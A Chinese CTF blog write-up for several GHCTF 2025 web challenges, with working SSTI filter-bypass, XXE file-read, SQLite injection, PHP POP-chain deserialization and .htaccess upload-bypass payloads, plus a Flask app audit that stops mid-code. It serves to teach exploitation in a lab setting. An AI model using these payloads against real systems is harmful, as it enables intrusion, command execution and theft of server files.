@@ -1,0 +1,943 @@
+---
+title: 2025GHCTFwp
+date: 2025-3-21 11:45:14
+cover: /img/cover/2025GHCTFwp.jpg
+tags:
+  - CTFWeb
+categories:
+  - 2025CTF
+---
+<meta name="referrer" content="no-referrer"/>
+
+## upload?SSTI!
+
+![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1740978093558-1a738db1-953c-4f2e-b485-383d672cb111.png)
+
+打开附件看看，发现只能上传txt,log,text,md,jpg,png,gif文件，过滤了_,,os__builtins__,subclasses,__globals__,flag这几个
+
+![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1740978158104-b04c73d3-0a89-4ba8-aa41-57f6b845272a.png)
+
+先试一下有没有回显
+
+![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1740978228391-12b3bfa1-119a-4ae1-be6a-d630914f1f0d.png)
+
+![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1740978245235-e972f08f-a1c6-4cb8-ba45-2b210a8a4974.png)
+
+打开文件路径 
+
+![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1740978254092-170ca6ae-948b-41ee-83d4-6fd293860931.png)
+
+查看有回显。说明上传成功了
+
+![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1740978281686-98deb6a7-fa40-45a2-8378-74d50c9f6ed1.png)
+
+之前在寒假学习中，经过高人指点，fenjing上有一个用法
+
+![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1740978042716-f8000827-aaba-4b0b-ad5c-7df5a76eb57a.png)
+
+所以直接把那几个拉进黑名单里
+
+![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1741091737533-b8a1593f-3410-4cc7-b7ef-d75ec4114bd9.png)
+
+跑出来一个playload
+
+```plain
+{% set ao = lipsum | escape | batch(22) | first | last %} {{ ((lipsum[ao+ao+'globals'+ao+ao][ao+ao+'builtins'+ao+ao][ao+ao+'import'+ao+ao]('os')).popen('cat /flag')).read() }} 
+``` 
+
+![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1741091899220-a94327ef-68bc-4313-a3c5-9c6dc5b56cb2.png)
+
+直接交看文件就行
+
+![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1740978173424-d6df2244-b46a-4a65-b603-442085534740.png)
+
+![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1740978112476-a91a57ff-4645-4fce-87ed-f8d03be3f7fb.png)
+
+![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1740978043093-e996b277-68f5-4a58-a061-a26853fe2156.png)
+
+
+
+## >(>﹏<)
+
+这一题感谢高人指点，要不，我什么都做不到……
+
+进去发现是一段flack代码
+
+![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1741087269003-17d5a9b4-14e0-4cac-ad66-eae49e49305f.png)
+
+在源代码这里他会整理一下
+
+![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1741087358610-ac775f6e-f832-442d-a845-6f62d155c750.png)
+
+审计一下代码发现在这个页面它会把代码显现出来，而在/ghctf中它才是我们传入playload的界面
+
+而在这个页面下先用post传参，用xml来接收并打印出来。
+
+如果xml没有参数，那么就返回System is safe
+
+如果有的话进入下一步：
+
+ parser = etree.XMLParser(load_dtd=True, resolve_entities=True)
+
+先是创建一个XML解释器对象，并配置其行为：(load_dtd=True, resolve_entities=True)
+
+load_did=True:允许解释器加载外部DTD（文档类型定义）文件。
+
+其中DVD用于定义XML文档的结构与实体。如果XML包含<!DOCTYPE[...]>声明，解释器会尝试加载指定外部的DVD文件（如 `SYSTEM"https://~~~~"`)
+
+resolve_entities=True:允许解析XML实体（如&xxe;）
+
+其中实体可以是预定义实体（如%lt; 表示<)、自定义内部实体（如<!ENTITY foo "bar">）、或外部实体（如<!ENTITY xxe STSTEM "file:///etc/passwd">）
+
+ root = etree.fromstring(xml, parser)
+
+使用配置的parser解析传入的XML字符串xml，生成一个XML树对象root
+
+解析器读取XML字符串，并验证其格式
+
+若存在<!DOCTYPE>声明且load_did=True，加载外部DVD
+
+若存在实体且resolve_entities=True，解析并替换所有实体（如把&xxe;换成文件内容）
+
+将解析后的XML转化为树状结构，root是根节点
+
+name=root.find('name').text
+
+从XML树中找一个名为name的直接子元素，并获取其文件内容
+
+root.find('name')：使用ElementTree的find()方法，按标签名name搜索直接子元素。注意，它仅匹配直接子节点，区分大小写，且不支持XPath表达式
+
+ return name or None
+
+返回<name>标签里的值或者什么都不返回
+
+![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1741087506887-edc73b67-bf69-43dd-bd20-3f9bfc8ead7a.png)
+
+刚才上文提到使用post来传参的，先用一个简单的xml=<root><name>Hello</name></root>试一下有没有回显
+
+![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1741089528540-2e3f961a-0831-4836-8ae3-60d9a7f9c523.png)
+
+发现有回显，所以可以构造playload了：
+
+```plain
+<?xml version="1.0"?>
+
+<!DOCTYPE data [
+
+  <!ENTITY xxe SYSTEM "file:///flag">
+
+]>
+
+<root>
+
+  <name>&xxe;</name>
+
+</root>
+```
+
+![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1741089670030-1b4deac9-b677-4fd6-85ce-7619d4628de6.png)直接上传不行，url编码一下得到
+
+xml=%3C%3Fxml%20version%3D%221.0%22%3F%3E%0A%3C%21DOCTYPE%20data%20%5B%0A%
+
+20%20%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fflag%22%3E%0A%5D%3E%0A%3Croot%3E%0A%20%20%3Cname%3E%26xxe%3B%3C%2Fname%3E%0A%3C%2Froot%3E
+
+大功告成：
+
+![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1741089762976-d85c87a0-72df-47d5-9abb-ef0d09e13061.png)
+
+## [GHCTF 2025]SQL???
+学习文章:
+
+[<font style="color:#3370FF;">GHCTF2025-WEB新手向(?)解析-SQL???</font>](https://blog.csdn.net/yeyushengfano/article/details/146178894)
+
+[<font style="color:#3370FF;">SQLite 数据库注入总结</font>](https://www.jianshu.com/p/db0124676ca9)
+
+[<font style="color:#3370FF;">WEB渗透Web突破篇-SQL注入（SQLite）</font>](https://blog.csdn.net/qq_59468567/article/details/140819336)
+
+[<font style="color:#3370FF;">SQLite sqlite_master</font>](https://blog.csdn.net/luoshabugui/article/details/108327936)
+
+判断回显显位数
+
+![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1746464492487-cae0da73-d9c9-4058-864f-76bfe937ffde.png)
+
+6就不行了,所以是5位
+
+![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1746464492787-ff3c845c-b56f-4bdc-a824-8e6b735e674d.png)
+
+成功显示
+
+![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1746464493029-dd6feafc-436f-47b1-af51-232bae253870.png)
+
+union select 1,2,3,4,sql from sqlite_master
+
+其中sqlite_master 是 SQLite 数据库的系统表（类似于其他数据库的 information_schema），它存储了当前数据库中所有对象的元数据（如表、索引、视图、触发器等）。其结构如下：
+
+![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1746464493331-5f0b22e4-bb7f-47b0-952c-dd4b08d20547.png)
+
+点击图片可查看完整电子表格
+
+sql 是 sqlite_master 表中的一列，记录了创建数据库对象（如表、索引）时使用的 原始SQL语句。通过查询此字段，攻击者可以获取以下信息：
+
+表结构：例如 CREATE TABLE users(id INT, name TEXT, password TEXT)，直接泄露字段名。
+
+索引和约束：了解数据库的索引策略。
+
+敏感逻辑：如触发器中可能包含的业务逻辑。
+
+![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1746464493588-a0694f9b-6d9e-49f8-8a81-01399a6cdb33.png)
+
+<font style="color:#8F959E;"></font>
+
+成功找到表和列名,直接查就行
+
+![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1746464493948-cd883573-92f8-4fb3-a942-0549ddb28faa.png)
+
+## Popppppp
+先找入口，发现这里都是原生函数，并且这上面的$arg1,$day1什么的，应该就是链尾了。一般来说，针对反序列化的题目，一定要把链尾找到，所谓的链尾，就是我们实现恶意代码的地方。
+
+![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1746464494197-bc4a3c92-95f2-44bc-9154-277ddd0b6cb8.png)
+
+该函数的魔术方法是__get()，从访问不可访问或不存在的数据就会触发__get()魔术方法
+
+目前的链子：Mystery{__get()}
+
+仔细看了以下源码，发现Philosopher中hey是不存在的值，所以就会触发__get()方法，此处有发现了__invoke()魔术方法，__invoke()方法是尝试将对象调用为函数时触发这个魔术方法
+
+![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1746464494360-77132e71-ea2f-4722-8e0c-454a0f3f1a3c.png)
+
+目前的链子：Philosopher{__invoke()}->Mystery{__get()}
+
+在Warlord发现function原本是变量，但是被当成函数了，所以就触发了__invoke()方法，在此处又发现了__call()魔术方法，当对象访问⼀个不存在的方法,或者不可访问的方法时候触发
+
+![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1746464494512-09eb0037-5cd9-40cd-b6de-a612e304a1ed.png)
+
+目前的链子：Warlord{__call()}->Philosopher{__invoke()}->Mystery{__get()}
+
+看了一遍发现Samurai中的add()比较奇怪，是个不存在的函数或魔术方法，自然就会触发__call魔术方法
+
+![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1746464494666-cada9579-9bf5-4b60-9df0-94d52ce1aa0e.png)
+
+在其中还有__toString魔术方法以及__set()魔术方法，
+
+目前的链子：Samurai{__toString}->Warlord{__call()}->Philosopher{__invoke()}->Mystery{__get()}
+
+__toString是在对象(指实例化类的变量)被当成字符串调用的时候触发//echo，
+
+__set()是在动态设置不可访问的属性时或未定义的属性时被调用
+
+在CherryBlossom中就找到了，把fruit1当作了字符串，所以就会触发__toString魔术方法，
+
+其中还有__distruct魔术方法。至此，一条pop链就很清晰了
+
+![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1746464494841-8cf74d8d-5deb-44eb-9e19-03d177b4f2d4.png)
+
+链子：CherryBlossom{__distruct}->Samurai{__toString}->Warlord{__call()}->Philosopher{__invoke()}->Mystery{__get()}
+
+接下来就是进行绕过双重md5了
+
+```php
+class Philosopher {
+    public $fruit10;
+    public $fruit11="sr22kaDugamdwTPhG5zU";
+
+    public function __invoke() {
+        if (md5(md5($this->fruit11)) == 666) {
+            return $this->fruit10->hey;
+        }
+    }
+}
+```
+
+AI写的脚本：
+
+```python
+# -*- coding: utf-8 -*-
+import multiprocessing
+import hashlib
+import random
+import string
+import sys
+
+# ========== 用户配置区域 ==========
+TARGET_SUBSTR = "666"   # 要匹配的目标子串
+START_POS = 0           # 子串的起始位置
+RAND_STR_LEN = 20       # 随机字符串长度
+# ================================
+
+CHARS = string.ascii_letters + string.digits
+
+def cmp_md5(stop_event):
+    global CHARS, TARGET_SUBSTR, START_POS, RAND_STR_LEN
+    str_len = len(TARGET_SUBSTR)
+    while not stop_event.is_set():
+        rnds = ''.join(random.choice(CHARS) for _ in range(RAND_STR_LEN))
+        # 第一次MD5计算（需将字符串转为字节）
+        m1 = hashlib.md5(rnds.encode('utf-8'))  # Python 3 需要明确编码为字节
+        hex1 = m1.hexdigest()
+        if hex1[START_POS:START_POS+str_len] == TARGET_SUBSTR:
+            # 第二次MD5使用第一次的二进制结果
+            digest1 = m1.digest()
+            m2 = hashlib.md5(digest1)
+            hex2 = m2.hexdigest()
+            if hex2[START_POS:START_POS+str_len] == TARGET_SUBSTR:
+                print(f"[Found] 原始字符串: {rnds}")
+                print(f"第一次MD5: {hex1}")
+                print(f"第二次MD5: {hex2}\n")
+                stop_event.set()
+
+if __name__ == '__main__':
+    print("开始碰撞双重MD5...")
+    print(f"目标特征: '{TARGET_SUBSTR}' (起始位置: {START_POS})")
+    print(f"随机字符串长度: {RAND_STR_LEN}")
+    print("按 Ctrl+C 可提前终止\n")
+
+    cpus = multiprocessing.cpu_count()
+    stop_event = multiprocessing.Event()
+    processes = [multiprocessing.Process(target=cmp_md5, args=(stop_event,))
+                 for _ in range(cpus)]
+    for p in processes:
+        p.start()
+    for p in processes:
+        p.join()
+#结果：
+#开始碰撞双重MD5...
+#目标特征: '666' (起始位置: 0)
+#随机字符串长度: 20
+#按 Ctrl+C 可提前终止
+
+#[Found] 原始字符串: rSYwGEnSLmJWWqkEARJp
+#第一次MD5: 666e8881ab925da651dcd5b0953f5745
+#第二次MD5: 666d9a77a7ada5a819c7bf996a80fb        
+```
+
+GlobIterator是遍历一个文件系统行为，用这个来遍历显示文件，从而找到flag
+
+[<font style="color:#3370FF;">GlobIterator 类 </font>](https://www.php.net/manual/zh/class.globiterator.php)
+
+```php
+?php
+  error_reporting(0);
+class CherryBlossom
+{
+  public $fruit1;
+  public $fruit2;
+  function __destruct()
+  {
+    echo $this->fruit1;
+  }
+  public function __toString()
+  {
+    $newFunc = $this->fruit2;
+    return $newFunc();
+  }
+}
+class Mystery
+{
+  public $GlobIterator="/*";
+  public function __get($arg1)
+  {
+    array_walk($this, function ($day1, $day2) {
+      $day3 = new $day2($day1);
+      foreach ($day3 as $day4) {
+        echo($day4 . '<br>');
+      }
+    });
+  }
+}
+class Philosopher
+{
+  public $fruit10;
+  public $fruit11="rSYwGEnSLmJWWqkEARJp";
+  public function __invoke()
+  {
+    if (md5(md5($this->fruit11)) == 666) {
+      return $this->fruit10->hey;
+    }
+  }
+}
+$b=new CherryBlossom();
+$b->fruit1=new CherryBlossom();
+$b->fruit1->fruit2=new Philosopher();
+$b->fruit1->fruit2->fruit10=new Mystery();
+$c=serialize($b);
+echo $c;
+```
+
+```plain
+?GHCTF=O:13:"CherryBlossom":2:{s:6:"fruit1";O:13:"CherryBlossom":2:{s:6:"fruit1";N;s:6:"fruit2";O:11:"Philosopher":2:{s:7:"fruit10";O:7:"Mystery":1:{s:12:"GlobIterator";s:2:"/*";}s:7:"fruit11";s:20:"rSYwGEnSLmJWWqkEARJp";}}s:6:"fruit2";N;}
+```
+
+![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1746464495006-f7a9ad68-a053-465e-ab27-14f5266bd9eb.png)
+
+SplFileObject 类为文件提供了一个面向对象接口，直接读取flag
+
+[<font style="color:#3370FF;">SplFileObject类</font>](https://www.php.net/manual/zh/class.splfileobject.php#class.splfileobject)
+
+```php
+<?php
+  error_reporting(0);
+class CherryBlossom
+{
+  public $fruit1;
+  public $fruit2;
+  function __destruct()
+  {
+    echo $this->fruit1;
+  }
+  public function __toString()
+  {
+    $newFunc = $this->fruit2;
+    return $newFunc();
+  }
+}
+class Mystery
+{
+  public $SplFileObject="/flag44545615441084";
+  public function __get($arg1)
+  {
+    array_walk($this, function ($day1, $day2) {
+      $day3 = new $day2($day1);
+      foreach ($day3 as $day4) {
+        echo($day4 . '<br>');
+      }
+    });
+  }
+}
+class Philosopher
+{
+  public $fruit10;
+  public $fruit11="rSYwGEnSLmJWWqkEARJp";
+  public function __invoke()
+  {
+    if (md5(md5($this->fruit11)) == 666) {
+      return $this->fruit10->hey;
+    }
+  }
+}
+$b=new CherryBlossom();
+$b->fruit1=new CherryBlossom();
+$b->fruit1->fruit2=new Philosopher();
+$b->fruit1->fruit2->fruit10=new Mystery();
+$c=serialize($b);
+echo $c;
+```
+
+```plain
+?GHCTF=O:13:"CherryBlossom":2:{s:6:"fruit1";O:13:"CherryBlossom":2:{s:6:"fruit1";N;s:6:"fruit2";O:11:"Philosopher":2:{s:7:"fruit10";O:7:"Mystery":1:{s:13:"SplFileObject";s:19:"/flag44545615441084";}s:7:"fruit11";s:20:"rSYwGEnSLmJWWqkEARJp";}}s:6:"fruit2";N;}
+```
+
+![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1746464495240-8b72fb9f-20a2-4b28-ae37-7e330cd9574a.png)
+
+## ez_readfile
+题目是a和b原来的值不相等而md5的值相等
+
+![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1746464495475-e6634ee0-61ed-4214-aad8-6b5765823d84.png)
+
+所以使用fastcoll来跑
+
+![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1746464495727-f65b813d-8214-41e8-854d-c9921c2a78d6.png)
+
+绕过成功
+
+![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1746464496070-d4c14553-6851-413d-a08b-16374437857d.png)
+
+看了wp：在php出题模版中，有⼀个容器启动命令文件docker-entrypoint.sh。可以看到该命令⽂件在容器初 
+
+始化后就会被删掉。但是在提交⽣成镜像后，由镜像⽣成容器⼜需要运⾏该⽂件。因此有的出题者为了 
+
+⽅便可能就不删除该⽂件，这时候就可以碰碰运⽓，看看出题者有没有把这个⽂件删掉。没有删掉，就 
+
+能够获取路径。
+
+所以接下来对docker-entrypoint.sh入手，成功
+
+![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1746464496315-f7fe9f81-2bdc-4b6e-96a0-0121a6913574.png)
+
+访问
+
+```plain
+file=/f1wlxekj1lwjek1lkejzs1lwje1lwesjk1wldejlk1wcejl1kwjelk1wjcle1jklwecj1lkwcjel1kwjel1cwjl1jwlkew1jclkej1wlkcj1lkwej1lkcwjellag
+```
+
+得到flag
+
+![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1746464496588-7f24fe53-516f-4a56-b787-2341cc89f269.png)
+
+看了一份大佬的wp，这两个字符串也能达到同样的效果，学到了
+
+```plain
+a=TEXTCOLLBYfGiJUETHQ4hEcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak
+b=TEXTCOLLBYfGiJUETHQ4hAcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak
+```
+
+![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1746464496883-b4ad3da3-9580-48fe-8900-bc25f5fc510f.png)
+
+学到了学到了
+
+![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1746464497162-b8e8df16-edcc-489b-97a3-f65372b40d66.png)
+
+![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1746464497410-6fe9a642-eab8-46ac-aa95-cda1bb4dfead.png)
+
+## UPUPUP
+参考文章：[<font style="color:#3370FF;">GHCTF2025-WEB新手向详解-UP UP UP！</font>](https://blog.csdn.net/yeyushengfano/article/details/146245007)
+
+进入靶场
+
+![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1746464497656-24d0c457-6425-4c37-aff0-9d678adaa603.png)
+
+先爆破一下可以使用的文件其中GIF89a，是常见的图片文件幻术头GIF89a
+
+![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1746464497948-3a1287c6-881d-45e8-ab4d-1df2734a1f42.png)
+
+![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1746464498235-e4656aba-c0ce-4a99-9480-307606244bdd.png)
+
+![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1746464498496-b0830cd3-0df6-4dd4-a163-bca0239d0297.png)
+
+![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1746464498826-de81b044-6606-4f00-a52e-7862d1526c52.png)
+
+几个示例下来发现php,phpml是不行的并且不区分大小写，也就是说直接上传一句话木马的php文件是不行的，而jpg,html文件是可行的，之后又加了.png和.htaccess文件都能成功，所以接下来从这个思路入手。
+
+所以编辑.htaccess文件
+
+![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1746464499052-c1095ce8-83be-45ec-a495-953170272cc2.png)
+
+写upload.jpg文件
+
+![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1746464499216-77627e07-d735-4726-b182-6c792142014f.png)
+
+<font style="color:#8F959E;"></font>
+
+分别在靶场上传.htaccess和upload.jpg（改包上传也行），之后访问upload.jpg检查是否成功
+
+若出现这样的界面出现php报错，说明这个php代码已经执行成功了，这样也就上传成功了，可以蚁剑连接了
+
+![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1746464499429-7bb91967-ad31-4ee0-a9c5-37bb3c164560.png)
+
+hhhhhh，这些爆破测试用的文件都在这里
+
+![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1746464499698-06627e42-0932-4306-b03f-addee3cdad33.png)
+
+找到flag
+
+![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1746464499939-3f6f7fba-ba3a-452d-ab6d-63b2522dbdaa.png)
+
+![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1746464500143-681419cf-229a-48f4-bb8d-b3463c3b22ed.png)
+
+学到的知识（早读在背了）：
+
+GIF89a的知识： 
+
+一个GIF89a图形文件就是一个根据图形交换格式（GIF）89a版（1989年7 月发行）进行格式化之后的图形。在GIF89a之前还有87a版（1987年5月发行），但在Web上所见到的大多数图形都是以89a版的格式创建的。 89a版的一个最主要的优势就是可以创建动态图像，例如创建一个旋转的图标、用一只手挥动的旗帜或是变大的字母。特别值得注意的是，一个动态GIF是一个 以GIF89a格式存储的文件，在一个这样的文件里包含的是一组以指定顺序呈现的图片。GIF89a是 GIF 动画和透明效果的技术基础，它的存在表明文件支持更高级的功能。
+
+攻击者可在恶意文件（如 PHP、HTML、SSRF Payload）开头插入GIF89a头，伪装成合法 GIF 文件，绕过文件类型检测，以达到攻击的目的
+
+关于.htaccess文件（deepseek生成）：
+
+在 CTF Web 题目中，.htaccess文件是 Apache 服务器的配置文件，通常用于控制目录级别的服务器行为。攻击者可通过篡改或上传该文件实现 权限绕过、代码执行、路径劫持 等攻击。以下是其核心作用及典型利用场景：
+
+重写 URL（Rewrite Rules）：通过 RewriteEngine 和 RewriteRule 修改请求路径，常用于隐藏真实文件路径或实现伪静态化。
+
+设置文件类型解析：使用 AddType 或 AddHandler 强制服务器将特定文件（如 .jpg）解析为动态脚本（如 PHP）。
+
+权限控制：限制目录访问（Deny/Allow）、IP 过滤、密码保护等。
+
+自定义错误页面：通过 ErrorDocument 定义错误响应（如 404 页面）。
+
+包含其他文件：利用 php_value auto_prepend_file 包含恶意代码。
+
+.xbm和.wbmp文件幻术头为.htaccess的注释符的检测绕过：
+
+[<font style="color:#3370FF;">php 文件上传.htaccess getimagesize和exif_imagetype绕过</font>](https://blog.csdn.net/qq_45570082/article/details/108910162)
+
+.htaccess中的注释符有：  \x00  和  #，而有两种不常见的图片类型文件.xbm和.wbmp，其文件幻术头正是以这些注释符作为开头。
+
+.xbm图片的文件幻术头为：
+
+#define width 1337
+
+#define height 1337
+
+.wbmp图片的文件幻术头为：
+
+\x00\x00\x85\x85 或者 \x00\x00\x8a\x39\x8a\x39
+
+## [GHCTF 2025]Goph3rrr
+![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1746464500464-b736d11b-bcc7-4fee-badd-1deef3528ccd.png)
+
+扫目录
+
+![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1746464500776-f71c8830-69f9-42c9-b583-87742b086b59.png)
+
+有个app.py的目录
+
+![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1746464500918-6a2f1f8b-9eef-459b-9476-bf6d4e1dc2bc.png)
+
+下载了一个文件
+
+![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1746464501121-c34c4dc3-a511-43f9-bd7b-918d77506f24.png)
+
+wc一堆base64
+
+![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1746464501554-53ad4b6c-e944-4507-942a-0842ce396922.png)
+
+尝试解码,但是失败了,分析一下,前面的PNG应该代表这是一个由base64进行编码的二进制图片吧就是靶场显示的那张,我猜的
+
+![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1746464501862-73cb61ee-4a77-4e68-8174-0d5692b37b70.png)
+
+试着本地运行一下
+
+![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1746464502322-44dd6d76-d1bc-4de1-b101-30b3d7b26a06.png)
+
+确实
+
+![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1746464502674-f03583db-c234-4807-8906-194ad3d01d5c.png)
+
+审计app.py代码
+
+flask框架
+
+```python
+from flask import Flask, request, send_file, render_template_string
+import os
+from urllib.parse import urlparse, urlunparse
+import subprocess
+import socket
+import hashlib
+import base64
+import random
+
+app = Flask(__name__)
+BlackList = [
+    "127.0.0.1"
+]
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=8000)
+```
+
+下载app.py
+
+```python
+@app.route('/app.py')
+def download_source():
+    return send_file(__file__, as_attachment=True)
+```
+
+根目录,生成图片,原base64编码的就不写了,省空间
+
+```html
+@app.route('/')
+def index():
+return '''
+<html>
+  <head>
+    <style>
+      body {
+        background-image: url('data:image/png;base64,
+          //[原base64,为了省空间就不写了]
+          ); /* 背景图像 */
+        background-size: cover; /* 背景图片覆盖整个页面 */
+        height: 100vh; /* 页面高度填满浏览器窗�? */
+        display: flex;
+        justify-content: center; /* 水平居中 */
+        align-items: center; /* 垂直居中 */
+        color: white; /* 字体颜色 */
+        font-family: Arial, sans-serif; /* 字体 */
+        text-align: center; /* 文字居中 */
+      }
+      h1 {
+        font-size: 50px;
+        transition: transform 0.2s ease-in-out; /* 设置浮动效果过渡时间 */
+      }
+      h1:hover {
+        transform: translateY(-10px); /* 向上浮动 */
+      }
+    </style>
+  </head>
+  <body>
+    <h1>Hello Ctfer!!! Welcome to the GHCTF challenge! (≧∇�?)</h1>
+  </body>
+</html>
+'''
+```
+
+/Login,判断username和passward,不重要
+
+```python
+@app.route('/Login', methods=['GET', 'POST'])
+def login():
+    junk_code()
+    if request.method == 'POST':
+        username = request.form.get('username')
+        password = request.form.get('password')
+        if username in users and users[username]['password'] == hashlib.md5(password.encode()).hexdigest():
+            return b64e(f"Welcome back, {username}!")
+        return b64e("Invalid credentials!")
+    return render_template_string("""
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <title>Login</title>
+            <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+            <style>
+                body {
+                    background-color: #f8f9fa;
+                }
+                .container {
+                    max-width: 400px;
+                    margin-top: 100px;
+                }
+                .card {
+                    border: none;
+                    border-radius: 10px;
+                    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+                }
+                .card-header {
+                    background-color: #007bff;
+                    color: white;
+                    text-align: center;
+                    border-radius: 10px 10px 0 0;
+                }
+                .btn-primary {
+                    background-color: #007bff;
+                    border: none;
+                }
+                .btn-primary:hover {
+                    background-color: #0056b3;
+                }
+            </style>
+        </head>
+        <body>
+            <div class="container">
+                <div class="card">
+                    <div class="card-header">
+                        <h3>Login</h3>
+                    </div>
+                    <div class="card-body">
+                        <form method="POST">
+                            <div class="mb-3">
+                                <label for="username" class="form-label">Username</label>
+                                <input type="text" class="form-control" id="username" name="username" required>
+                            </div>
+                            <div class="mb-3">
+                                <label for="password" class="form-label">Password</label>
+                                <input type="password" class="form-control" id="password" name="password" required>
+                            </div>
+                            <button type="submit" class="btn btn-primary w-100">Login</button>
+                        </form>
+                    </div>
+                </div>
+            </div>
+        </body>
+        </html>
+    """)
+```
+
+/Upload,判断username,上传文件,不重要
+
+```python
+@app.route('/Upload', methods=['GET', 'POST'])
+def upload_avatar():
+    junk_code()
+    if request.method == 'POST':
+        username = request.form.get('username')
+        if username not in users:
+            return b64e("User not found!")
+        file = request.files.get('avatar')
+        if file:
+            file.save(os.path.join(avatar_dir, f"{username}.png"))
+            return b64e("Avatar uploaded successfully!")
+        return b64e("No file uploaded!")
+    return render_template_string("""
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <title>Upload Avatar</title>
+            <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+            <style>
+                body {
+                    background-color: #f8f9fa;
+                }
+                .container {
+                    max-width: 400px;
+                    margin-top: 100px;
+                }
+                .card {
+                    border: none;
+                    border-radius: 10px;
+                    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+                }
+                .card-header {
+                    background-color: #dc3545;
+                    color: white;
+                    text-align: center;
+                    border-radius: 10px 10px 0 0;
+                }
+                .btn-danger {
+                    background-color: #dc3545;
+                    border: none;
+                }
+                .btn-danger:hover {
+                    background-color: #c82333;
+                }
+            </style>
+        </head>
+        <body>
+            <div class="container">
+                <div class="card">
+                    <div class="card-header">
+                        <h3>Upload Avatar</h3>
+                    </div>
+                    <div class="card-body">
+                        <form method="POST" enctype="multipart/form-data">
+                            <div class="mb-3">
+                                <label for="username" class="form-label">Username</label>
+                                <input type="text" class="form-control" id="username" name="username" required>
+                            </div>
+                            <div class="mb-3">
+                                <label for="avatar" class="form-label">Avatar</label>
+                                <input type="file" class="form-control" id="avatar" name="avatar" required>
+                            </div>
+                            <button type="submit" class="btn btn-danger w-100">Upload</button>
+                        </form>
+                    </div>
+                </div>
+            </div>
+        </body>
+        </html>
+    """)
+```
+
+还是判断username和password,不重要
+
+```python
+@app.route('/RRegister', methods=['GET', 'POST'])
+def register():
+    junk_code()
+    if request.method == 'POST':
+        username = request.form.get('username')
+        password = request.form.get('password')
+        if username in users:
+            return b64e("Username already exists!")
+        users[username] = {'password': hashlib.md5(password.encode()).hexdigest()}
+        return b64e("Registration successful!")
+    return render_template_string("""
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <title>Register</title>
+            <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+            <style>
+                body {
+                    background-color: #f8f9fa;
+                }
+                .container {
+                    max-width: 400px;
+                    margin-top: 100px;
+                }
+                .card {
+                    border: none;
+                    border-radius: 10px;
+                    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+                }
+                .card-header {
+                    background-color: #28a745;
+                    color: white;
+                    text-align: center;
+                    border-radius: 10px 10px 0 0;
+                }
+                .btn-success {
+                    background-color: #28a745;
+                    border: none;
